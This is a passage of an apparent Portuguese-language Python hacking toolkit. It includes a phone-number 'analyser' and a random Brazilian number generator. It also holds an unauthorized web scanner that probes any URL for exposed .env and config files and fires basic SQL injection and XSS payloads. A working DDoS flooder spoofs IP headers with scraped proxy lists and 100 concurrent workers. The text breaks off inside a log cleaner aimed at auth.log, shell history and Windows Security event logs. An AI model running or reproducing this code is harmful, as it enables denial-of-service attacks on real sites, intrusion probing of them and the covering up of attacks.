    numero_limpo = "".join(c for c in numero if c.isdigit() or c == "+")

    if not numero_limpo or len(numero_limpo) < 8:
        print(f"{BRIGHT_RED}[!] Número inválido, parceiro{RESET}")
        return

    print(f"\n{BRIGHT_GREEN}[+] Analisando {numero}...{RESET}")

    def extrair_info_numero(num):
        """Extrai país, DDD e número do telefone"""
        # Detecta código do país
        if num.startswith("+"):
            if num.startswith("+55"):
                pais = "Brasil"
                ddd = num[3:5] if len(num) > 5 else "00"
                numero_base = num[5:]
            elif num.startswith("+1"):
                pais = "EUA/Canadá"
                ddd = num[2:5] if len(num) > 5 else "000"
                numero_base = num[5:]
            elif num.startswith("+44"):
                pais = "Reino Unido"
                ddd = num[3:5] if len(num) > 5 else "00"
                numero_base = num[5:]
            else:
                pais = "Internacional"
                ddd = "00"
                numero_base = num[1:]
        else:
            # Número sem código do país
            pais = "Brasil (provável)"
            if num.startswith("0"):
                ddd = num[1:3] if len(num) > 3 else "00"
                numero_base = num[3:]
            else:
                ddd = num[:2] if len(num) >= 10 else "00"
                numero_base = num[2:] if len(num) >= 10 else num

        return pais, ddd, numero_base

    def identificar_operadora(ddd, pais):
        """Identifica operadora baseada no DDD e país"""
        if pais == "Brasil":
            operadoras_br = {
                "11": "Vivo/Claro/TIM",
                "12": "Vivo/Claro",
                "13": "TIM/Vivo",
                "14": "Oi/Claro",
                "15": "TIM/Vivo",
                "16": "Claro/Vivo",
                "17": "Oi/Vivo",
                "18": "TIM/Claro",
                "19": "Vivo/Claro",
                "21": "TIM/Oi",
                "22": "Oi/TIM",
                "24": "Claro/TIM",
                "27": "Oi/Claro",
                "28": "TIM/Oi",
                "31": "Claro/TIM",
                "32": "TIM/Claro",
                "33": "Oi/Claro",
                "34": "TIM/Vivo",
                "35": "Claro/TIM",
                "37": "Oi/Claro",
                "38": "TIM/Claro",
                "41": "Oi/Claro",
                "42": "TIM/Claro",
                "43": "Claro/Oi",
                "44": "TIM/Claro",
                "45": "Claro/TIM",
                "46": "TIM/Claro",
                "47": "Claro/Oi",
                "48": "TIM/Claro",
                "49": "Claro/TIM",
                "51": "TIM/Claro",
                "52": "Claro/TIM",
                "53": "TIM/Claro",
                "54": "Claro/TIM",
                "55": "TIM/Claro",
                "61": "Claro/Vivo",
                "62": "TIM/Claro",
                "63": "Claro/TIM",
                "64": "TIM/Claro",
                "65": "Claro/Vivo",
                "66": "TIM/Claro",
                "67": "Claro/TIM",
                "68": "TIM/Claro",
                "69": "Claro/TIM",
                "71": "Oi/Claro",
                "73": "Claro/Oi",
                "74": "TIM/Claro",
                "75": "Claro/Oi",
                "77": "Oi/Claro",
                "79": "TIM/Claro",
                "81": "Oi/Claro",
                "82": "TIM/Claro",
                "83": "Claro/TIM",
                "84": "TIM/Claro",
                "85": "Claro/Oi",
                "86": "TIM/Claro",
                "87": "Claro/Oi",
                "88": "TIM/Claro",
                "89": "Claro/TIM",
                "91": "TIM/Claro",
                "92": "Claro/TIM",
                "93": "TIM/Claro",
                "94": "Claro/TIM",
                "95": "TIM/Claro",
                "96": "Claro/TIM",
                "97": "TIM/Claro",
                "98": "Claro/TIM",
                "99": "TIM/Claro",
            }
            return operadoras_br.get(ddd, "Operadora não identificada")
        elif pais == "EUA/Canadá":
            return "Verizon/AT&T/T-Mobile"
        elif pais == "Reino Unido":
            return "Vodafone/EE/O2"
        else:
            return "Operadora internacional"

    def identificar_regiao(ddd, pais):
        """Identifica região baseada no DDD e país"""
        if pais == "Brasil":
            regioes_br = {
                "11": "São Paulo (SP)",
                "12": "São José dos Campos (SP)",
                "13": "Santos (SP)",
                "14": "Bauru (SP)",
                "15": "Sorocaba (SP)",
                "16": "Ribeirão Preto (SP)",
                "17": "São José do Rio Preto (SP)",
                "18": "Presidente Prudente (SP)",
                "19": "Campinas (SP)",
                "21": "Rio de Janeiro (RJ)",
                "22": "Campos dos Goytacazes (RJ)",
                "24": "Volta Redonda (RJ)",
                "27": "Vitória (ES)",
                "28": "Cachoeiro de Itapemirim (ES)",
                "31": "Belo Horizonte (MG)",
                "32": "Juiz de Fora (MG)",
                "33": "Governador Valadares (MG)",
                "34": "Uberlândia (MG)",
                "35": "Poços de Caldas (MG)",
                "37": "Divinópolis (MG)",
                "38": "Montes Claros (MG)",
                "41": "Curitiba (PR)",
                "42": "Ponta Grossa (PR)",
                "43": "Londrina (PR)",
                "44": "Maringá (PR)",
                "45": "Foz do Iguaçu (PR)",
                "46": "Francisco Beltrão (PR)",
                "47": "Joinville (SC)",
                "48": "Florianópolis (SC)",
                "49": "Chapecó (SC)",
                "51": "Porto Alegre (RS)",
                "52": "Pelotas (RS)",
                "53": "Bagé (RS)",
                "54": "Caxias do Sul (RS)",
                "55": "Santa Maria (RS)",
                "61": "Brasília (DF)",
                "62": "Goiânia (GO)",
                "63": "Palmas (TO)",
                "64": "Rio Verde (GO)",
                "65": "Cuiabá (MT)",
                "66": "Rondonópolis (MT)",
                "67": "Campo Grande (MS)",
                "68": "Rio Branco (AC)",
                "69": "Porto Velho (RO)",
                "71": "Salvador (BA)",
                "73": "Ilhéus (BA)",
                "74": "Juazeiro (BA)",
                "75": "Feira de Santana (BA)",
                "77": "Vitória da Conquista (BA)",
                "79": "Aracaju (SE)",
                "81": "Recife (PE)",
                "82": "Maceió (AL)",
                "83": "João Pessoa (PB)",
                "84": "Natal (RN)",
                "85": "Fortaleza (CE)",
                "86": "Teresina (PI)",
                "87": "Petrolina (PE)",
                "88": "Juazeiro do Norte (CE)",
                "89": "Picos (PI)",
                "91": "Belém (PA)",
                "92": "Manaus (AM)",
                "93": "Santarém (PA)",
                "94": "Marabá (PA)",
                "95": "Boa Vista (RR)",
                "96": "Macapá (AP)",
                "97": "Manicoré (AM)",
                "98": "São Luís (MA)",
                "99": "Imperatriz (MA)",
            }
            return regioes_br.get(ddd, "Região não identificada")
        elif pais == "EUA/Canadá":
            return "Nova York/Toronto (área)"
        elif pais == "Reino Unido":
            return "Londres (área)"
        else:
            return "Região internacional"

    def identificar_apps(numero_local, pais):
        """Identifica possíveis apps associados"""
        apps = []

        # WhatsApp funciona em basicamente todos os números
        apps.append("WhatsApp")

        # Telegram também é global
        apps.append("Telegram")

        # Apps específicos por país
        if pais == "Brasil":
            if len(numero_local) == 9 and numero_local[0] == "9":
                apps.extend(["Possível Instagram", "Signal"])
        elif pais == "EUA/Canadá":
            apps.extend(["iMessage", "Signal"])
        elif pais == "Reino Unido":
            apps.extend(["Signal", "Possível Instagram"])

        return ", ".join(apps)

    def analisar_risco(numero_local):
        """Analisa padrões suspeitos no número"""
        # Remove qualquer formatação
        num_clean = "".join(c for c in numero_local if c.isdigit())

        # Padrões suspeitos
        suspeitos = ["999", "888", "777", "12345", "54321", "11111", "00000"]

        if any(padrao in num_clean for padrao in suspeitos):
            return "ALTO - Número sequencial/repetido"
        elif num_clean.count(num_clean[0]) == len(num_clean):
            return "ALTO - Todos dígitos iguais"
        elif num_clean == num_clean[::-1]:
            return "MÉDIO - Número palíndromo"
        else:
            return "BAIXO - Padrão normal"

    # Processa o número
    pais, ddd, numero_base = extrair_info_numero(numero_limpo)

    # Coleta os dados
    dados = {
        "Número Original": numero,
        "Número Limpo": numero_limpo,
        "País": pais,
        "DDD/Área": ddd,
        "Número Local": numero_base,
        "Operadora": identificar_operadora(ddd, pais),
        "Região": identificar_regiao(ddd, pais),
        "Possíveis apps": identificar_apps(numero_base, pais),
        "Risco de golpe": analisar_risco(numero_base),
    }

    # Mostra resultados
    print(f"\n{BRIGHT_MAGENTA}=== RESULTADOS DA ANÁLISE ==={RESET}")
    for chave, valor in dados.items():
        print(f"{CYAN}{chave}:{RESET} {WHIT}{valor}{RESET}")

    print(f"\n{BRIGHT_GREEN}[+] Análise concluída!{RESET}")
    d = input("\n⏎ Pressione Enter para voltar ao menu...")
    if d == "":
        clear_console()
        menu()
    else:
        clear_console()
        menu()


def phone_generator():
    clear_console()
    banner_phone_generator = f"""{CYAN}    
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     
@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@     
@@@@@@       @@@@@@@@@@@@@@@  @@@@@@@@@@     
@@@@@         @@@@@@@@  @@@@@@  @@@@@@@@     
@@@@@          @@@@@@@@@  @@@@@  @@@@@@@     
@@@@@          @@@@@@@@@@@  @@@@  @@@@@@     
@@@@@@        @@@@@  @@@@@  @@@@  @@@@@@     
@@@@@@      @@@@@@@@@@  @@@@ @@@@@ @@@@@     
@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@     
@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@     
@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@     
@@@@@@@@@@       @@@@@@@@@@@@@@@@@@@@@@@     
@@@@@@@@@@@@            @@@@@@@@@@@@@@@@     
@@@@@@@@@@@@@             @@@@@@@@@@@@@@     
@@@@@@@@@@@@@@@@           @@@@@@@@@@@@@     
@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@     
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    """
    print(f"{banner_phone_generator}\n")
    print(f"{CYAN}[1] Telefone BR (celular){RESET}")
    print(f"{CYAN}[2] Voltar para o menu{RESET}")

    opcao = input(f"\n{YELLOW}[>] Opção: {RESET}").strip()

    if opcao == "1":
        try:
            quantidade = int(input(f"{YELLOW}[?] Quantidade: {RESET}"))
            if quantidade > 1000:
                print(
                    f"{BRIGHT_RED}[!] Limite: 1000 números por vez (vai travar seu pc bomba ou o programa){RESET}"
                )
                quantidade = 1000
        except:
            quantidade = 1

        print(f"{BRIGHT_BLUE}[*] Gerando números de celular...{RESET}")

        ddd_comuns = ["11", "21", "31", "41", "51", "61", "71", "81", "91"]
        operadoras = ["9"]

        for i in range(quantidade):
            ddd = random.choice(ddd_comuns)
            prefixo = random.choice(operadoras)
            resto = "".join([str(random.randint(0, 9)) for _ in range(8)])
            numero = f"({ddd}) 9{resto[:4]}-{resto[4:]}"
            print(f"{WHIT}{i+1:2d}. {numero}{RESET}")

        time.sleep(2)
        wait_for_key()

    elif opcao == "2":
        clear_console()
        menu()

    else:
        print(f"{BRIGHT_RED}[!] Opção inválida{RESET}")
        time.sleep(1)
        phone_generator()


def scan_vulnerabilities():
    print(
        f"""{BLUE}
⣿⣿⣿⣿⠿⢋⣩⣤⣴⣶⣶⣦⣙⣉⣉⣉⣉⣙⡛⢋⣥⣶⣶⣶⣶⣶⣬⡙⢿⣿
⣿⣿⠟⣡⣶⣿⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠙
⣿⢋⣼⣿⠟⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢿⣿⣿⣿⣿⣧
⠃⣾⣯⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⡈⢿⣿⣿⣿⣿
⢰⣶⣼⣿⣷⣿⣽⠿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⣿⣷⡀⠛⢿⣿⣿     {WHIT}Scan -by {RESET}{RED}w_ky{RESET}{BLUE}
⢃⣺⣿⣿⣿⢿⠏⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⣿⣿⣿⣷⢹⣿⣷⣄⠄⠈⠉     {WHIT}ig: {RESET}{RED}0nickz02._{RESET}{BLUE}
⡼⣻⣿⣷⣿⠏⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣞⣿⣿⣿⠸⣿⣿⣿⣿⣶⣤  
⣇⣿⡿⣿⠏⣸⣎⣻⣟⣿⣿⣿⢿⣿⣿⣿⣿⠟⣩⣼⢆⠻⣿⡆⣿⣿⣿⣿⣿⣿
⢸⣿⡿⠋⠈⠉⠄⠉⠻⣽⣿⣿⣯⢿⣿⣿⡻⠋⠉⠄⠈⠑⠊⠃⣿⣿⣿⣿⣿⣿
⣿⣿⠄⠄⣰⠱⠿⠄⠄⢨⣿⣿⣿⣿⣿⣿⡆⢶⠷⠄⠄⢄⠄⠄⣿⣿⣿⣿⣿⣿
⣿⣿⠘⣤⣿⡀⣤⣤⣤⢸⣿⣿⣿⣿⣿⣿⡇⢠⣤⣤⡄⣸⣀⡆⣿⣿⣿⣿⣿⣿
⣿⣿⡀⣿⣿⣷⣌⣉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣌⣛⣋⣴⣿⣿⢣⣿⣿⣿⣿⡟⣿
⢹⣿⢸⣿⣻⣶⣿⢿⣿⣿⣿⢿⣿⣿⣻⣿⣿⣿⡿⣿⣭⡿⠻⢸⣿⣿⣿⣿⡇⢹
⠈⣿⡆⠻⣿⣏⣿⣿⣿⣿⣿⡜⣭⣍⢻⣿⣿⣿⣿⣿⣛⣿⠃⣿⣿⣿⣿⡿⠄⣼
⣦⠘⣿⣄⠊⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⣿⡿⠁⠄⠟{RESET}
\n"""
    )

    url = input(
        f"{WHIT}Digite a URL alvo (ex: {RESET}{RED}https://site.com{RESET}{WHIT}):{RESET}{RED} "
    ).strip()

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    resultados = []

    try:
        print(f"\n{WHIT}[+] Iniciando scan em: {RESET}{YELLOW}{url}{RESET}")
        response = requests.get(url, timeout=10, verify=False)

        # Headers de segurança
        headers = response.headers
        resultados.append(f"\n{RED}=== HEADERS DE SEGURANÇA ==={RESET}")

        security_headers = {
            "X-Frame-Options": "Proteção contra clickjacking",
            "X-Content-Type-Options": "Prevenção MIME sniffing",
            "Strict-Transport-Security": "Força HTTPS",
            "Content-Security-Policy": "Política de segurança de conteúdo",
            "X-XSS-Protection": "Proteção XSS",
        }

        for header, desc in security_headers.items():
            if header not in headers:
                resultados.append(f"[{RED}FALTA{RESET}] {header} - {desc}")
            else:
                resultados.append(f"[{GREEN}OK{RESET}] {header}: {headers[header]}")

        # Informações do servidor
        resultados.append(f"\n{RED}=== INFORMACOES DO SERVIDOR ==={RESET}")
        server_info = {
            "server": "Servidor web",
            "x-powered-by": "Tecnologia backend",
            "x-aspnet-version": "Versão ASP.NET",
        }

        for info, desc in server_info.items():
            if info in headers:
                resultados.append(f"[{RED}EXPOSTO{RESET}] {desc}: {headers[info]}")

        # Teste de diretórios sensíveis
        resultados.append(f"\n{RED}=== DIRETORIOS SENSIVEIS ==={RESET}")
        diretorios = [
            "admin",
            "phpmyadmin",
            "mysql",
            "backup",
            "uploads",
            "config",
            ".git",
            "wp-admin",
            "cpanel",
            "webmail",
            "server-status",
            "phpinfo.php",
            "test.php",
            "debug.php",
        ]

        for dir in diretorios:
            test_url = urljoin(url, dir)
            try:
                resp = requests.get(test_url, timeout=3, verify=False)
                if resp.status_code == 200:
                    resultados.append(f"[{RED}EXPOSTO{RESET}] {test_url}")
                elif resp.status_code == 403:
                    resultados.append(f"[{YELLOW}BLOQUEADO{RESET}] {test_url}")
            except:
                pass

        # Teste de arquivos sensíveis
        resultados.append(f"\n{RED}=== ARQUIVOS SENSIVEIS ==={RESET}")
        arquivos = [
            ".env",
            "config.php",
            "wp-config.php",
            "backup.zip",
            "database.sql",
            "error_log",
            ".htaccess",
            "web.config",
        ]

        for arquivo in arquivos:
            test_url = urljoin(url, arquivo)
            try:
                resp = requests.get(test_url, timeout=3, verify=False)
                if resp.status_code == 200:
                    resultados.append(f"[{RED}EXPOSTO{RESET}] {test_url}")
            except:
                pass

        # Teste de métodos HTTP perigosos
        resultados.append(f"\n{RED}=== METODOS HTTP ==={RESET}")
        metodos = ["PUT", "DELETE", "TRACE", "OPTIONS"]
        for metodo in metodos:
            try:
                resp = requests.request(metodo, url, timeout=3, verify=False)
                if resp.status_code != 405:
                    resultados.append(
                        f"[{GREEN}LIVRE{RESET}] Método {metodo} permitido"
                    )
            except:
                pass

        # Verificação SSL/TLS
        resultados.append(f"\n{RED}=== SSL/TLS ==={RESET}")
        if url.startswith("https://"):
            try:
                import ssl

                hostname = urlparse(url).hostname
                context = ssl.create_default_context()
                with socket.create_connection((hostname, 443), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        resultados.append(
                            f"[{GREEN}SSL{RESET}] Certificado válido até: {GREEN}{cert['notAfter']}{RESET}"
                        )
            except Exception as e:
                resultados.append(f"[{RED}SSL ERROR{RESET}] {str(e)}")

        # Vulnerabilidades comuns
        resultados.append(f"\n{RED}=== TESTES DE VULNERABILIDADE ==={RESET}")

        # SQL Injection básico
        sqli_test = urljoin(url, "?id=1'")
        try:
            resp = requests.get(sqli_test, timeout=3, verify=False)
            if "sql" in resp.text.lower() or "syntax" in resp.text.lower():
                resultados.append(
                    f"[{RED}POSSIVEL{RESET}] {YELLOW}SQL{RESET} Injection em parâmetros GET"
                )
        except:
            pass

        # XSS básico
        xss_test = urljoin(url, '?q=<script>alert("xss")</script>')
        try:
            resp = requests.get(xss_test, timeout=3, verify=False)
            if '<script>alert("xss")</script>' in resp.text:
                resultados.append(f"[{RED}POSSIVEL{RESET}] XSS Refletido")
        except:
            pass

    except Exception as e:
        resultados.append(f"[{RED}ERRO CRITICO{RESET}] {str(e)}")

    # Exibe resultados
    clear_console()
    for resultado in resultados:
        print(f"{resultado}\n")

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    z = input("precione qualquer tecla para voltar...")
    if z == "":
        clear_console()
        menu()
    else:
        clear_console()
        menu()


def DDoS():
    banner = f"""{MAGENTA}
⣿⡟⠙⠛⠋⠩⠭⣉⡛⢛⠫⠭⠄⠒⠄⠄⠄⠈⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡇⠄⠄⠄⠄⣠⠖⠋⣀⡤⠄⠒⠄⠄⠄⠄⠄⠄⠄⠄⠄⣈⡭⠭⠄⠄⠄⠉⠙
⣿⡇⠄⠄⢀⣞⣡⠴⠚⠁⠄⠄⢀⠠⠄⠄⠄⠄⠄⠄⠄⠉⠄⠄⠄⠄⠄⠄⠄⠄
⣿⡇⠄⡴⠁⡜⣵⢗⢀⠄⢠⡔⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
⣿⡇⡜⠄⡜⠄⠄⠄⠉⣠⠋⠠⠄⢀⡄⠄⠄⣠⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸
⣿⠸⠄⡼⠄⠄⠄⠄⢰⠁⠄⠄⠄⠈⣀⣠⣬⣭⣛⠄⠁⠄⡄⠄⠄⠄⠄⠄⢀⣿   {WHIT}Tool -by {RESET}{BLUE}w_ky{MAGENTA}
⣏⠄⢀⠁⠄⠄⠄⠄⠇⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⡇⠄⠄⡇⠄⠄⠄⠄⢀⣾⣿   {WHIT}ig: {RESET}{BLUE}0nickz02._{MAGENTA}
⣿⣸⠈⠄⠄⠰⠾⠴⢾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣾⢀⠁⠄⠄⠄⢠⢸⣿⣿
⣿⣿⣆⠄⠆⠄⣦⣶⣦⣌⣿⣿⣿⣿⣷⣋⣀⣈⠙⠛⡛⠌⠄⠄⠄⠄⢸⢸⣿⣿
⣿⣿⣿⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠈⠄⠄⠄⠄⠄⠈⢸⣿⣿
⣿⣿⣿⠄⠄⠄⠘⣿⣿⣿⡆⢀⣈⣉⢉⣿⣿⣯⣄⡄⠄⠄⠄⠄⠄⠄⠄⠈⣿⣿
⣿⣿⡟⡜⠄⠄⠄⠄⠙⠿⣿⣧⣽⣍⣾⣿⠿⠛⠁⠄⠄⠄⠄⠄⠄⠄⠄⠃⢿⣿
⣿⡿⠰⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠩⠔⠒⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠘⣿
⣿⠃⠃⠄⠄⠄⠄⠄⠄⣀⢀⠄⠄⡀⡀⢀⣤⣴⣤⣤⣀⣀⠄⠄⠄⠄⠄⠄⠁⢹{RESET}
"""

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
        "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    ]

    proxy_sources = [
        "https://www.us-proxy.org",
        "https://www.socks-proxy.net",
        "https://proxyscrape.com/free-proxy-list",
        "https://www.proxynova.com/proxy-server-list/",
        "https://proxybros.com/free-proxy-list/",
        "https://proxydb.net/",
        "https://spys.one/en/free-proxy-list/",
        "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1",
        "https://hasdata.com/free-proxy-list",
        "https://www.proxyrack.com/free-proxy-list/",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxy-list.download/api/v1/get?type=socks4",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/proxies.txt",
        "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-List/main/proxies.txt",
    ]

    class CliAttacker:
        def __init__(self, target_url, num_requests):
            self.target_url = target_url
            self.num_requests = num_requests
            self.max_concurrent = 100
            self.request_limit = 50000000000

        def log(self, message):
            print(message)

        async def fetch_ip_addresses(self, url):
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                try:
                    async with session.get(url, timeout=5) as response:
                        text = await response.text()

                        ip_addresses = re.findall(
                            r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text
                        )
                        return ip_addresses
                except Exception as e:

                    self.log(f"Failed to fetch IPs from {url}: {e}")
                    return []

        async def get_all_ips(self):
            """Gathers IPs from all sources and adds some random ones."""
            tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
            ip_lists = await asyncio.gather(*tasks, return_exceptions=True)

            all_ips = [
                ip
                for sublist in ip_lists
                if isinstance(sublist, list)
                for ip in sublist
            ]

            all_ips.extend(
                [
                    f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    for _ in range(500)
                ]
            )
            return all_ips

        async def send_request(self, session, ip_address):
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": ip_address,
                "Accept": random.choice(
                    ["text/html", "application/json", "text/plain", "*/*"]
                ),
                "Accept-Language": random.choice(
                    ["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]
                ),
                "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
                "Cache-Control": "no-cache",
                "Connection": random.choice(["keep-alive", "close"]),
                "X-Real-IP": ip_address,
                "X-Request-ID": "".join(
                    random.choices(string.ascii_letters + string.digits, k=32)
                ),
                "Referer": random.choice(
                    [
                        "https://google.com",
                        "https://bing.com",
                        "https://yahoo.com",
                        self.target_url,
                        "https://duckduckgo.com",
                    ]
                ),
                "Origin": random.choice(
                    ["https://example.com", self.target_url, "https://randomsite.com"]
                ),
            }
            try:
                async with session.get(
                    self.target_url, headers=headers, timeout=2
                ) as response:

                    self.log(
                        f"{RED}w_ky@root -> {self.target_url} with IP: {ip_address} - Status: {response.status}{RESET}"
                    )
            except Exception:

                pass

        async def attack_worker(self, session, ip_cycle, requests_per_worker):
            """A worker task that sends a batch of requests."""
            for _ in range(requests_per_worker):
                await self.send_request(session, next(ip_cycle))

                await asyncio.sleep(1 / self.request_limit)

        async def attack(self):
            """Main async attack function."""
            ip_list = await self.get_all_ips()
            if not ip_list:
                self.log("No IP list found. Generating random IPs...")
                ip_list = [
                    f"10.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    for _ in range(1000)
                ]

            ip_cycle = itertools.cycle(ip_list)

            requests_per_worker = self.num_requests // self.max_concurrent

            async def worker():
                """Defines a worker session."""
                connector = aiohttp.TCPConnector(ssl=False)
                async with aiohttp.ClientSession(connector=connector) as session:
                    await self.attack_worker(session, ip_cycle, requests_per_worker)

            start_time = time.time()

            tasks = [worker() for _ in range(self.max_concurrent)]
            await asyncio.gather(*tasks, return_exceptions=True)
            elapsed_time = time.time() - start_time
            self.log(f"Attack finished in {elapsed_time:.2f} seconds. Target down!")

        def run(self):
            asyncio.run(self.attack())

    # Corrigi a indentação do main
    clear_console()
    print(banner)
    target_url = input("Enter Target URL: ")

    num_requests_str = input("Enter Number of Requests: ")
    try:
        num_requests = int(num_requests_str)
    except ValueError:
        print("Error: Number of requests must be an integer!")
        return

    if not target_url or num_requests <= 0:
        print("Error: Enter a valid URL and a positive number of requests!")
        return

    attacker = CliAttacker(target_url, num_requests)
    attacker.run()
    h = input("precione qualquer tecla para continuar...")
    if h == "":
        clear_console()
        menu()
    else:
        clear_console()
        menu()


def log_cleaner():
    class LogCleaner:
        def __init__(self):
            self.system = platform.system().lower()
            self.setup_paths()

    def setup_paths(self):
        if self.system == "linux":
            self.browser_paths = [
                f"{Path.home()}/.config/google-chrome",
                f"{Path.home()}/.config/chromium",
                f"{Path.home()}/.mozilla/firefox",
                f"{Path.home()}/.config/opera",
                f"{Path.home()}/.config/brave-browser",
                f"{Path.home()}/.config/slack",
                f"{Path.home()}/.config/discord",
            ]

            self.system_logs = [
                "/var/log/auth.log",
                "/var/log/syslog",
                "/var/log/messages",
                "/var/log/secure",
                f"{Path.home()}/.bash_history",
                f"{Path.home()}/.zsh_history",
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
            ]

            self.ssh_logs = [
                f"{Path.home()}/.ssh/known_hosts",
                f"{Path.home()}/.ssh/config",
                "/var/log/auth.log",
                "/var/log/secure",
            ]

        elif self.system == "windows":
            home = Path.home()
            appdata = os.environ.get("APPDATA", "")
            localappdata = os.environ.get("LOCALAPPDATA", "")

            self.browser_paths = [
                f"{localappdata}\\Google\\Chrome\\User Data\\Default",
                f"{localappdata}\\Microsoft\\Edge\\User Data\\Default",
                f"{appdata}\\Mozilla\\Firefox\\Profiles",
                f"{localappdata}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                f"{localappdata}\\Opera Software\\Opera Stable",
                f"{localappdata}\\Discord",
                f"{localappdata}\\slack",
            ]

            self.system_logs = [
                f"{os.environ.get('SystemRoot')}\\System32\\winevt\\Logs\\Application.evtx",
                f"{os.environ.get('SystemRoot')}\\System32\\winevt\\Logs\\System.evtx",
                f"{os.environ.get('SystemRoot')}\\System32\\winevt\\Logs\\Security.evtx",
                f"{os.environ.get('USERPROFILE')}\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
                f"{os.environ.get('USERPROFILE')}\\AppData\\Local\\Temp",
            ]

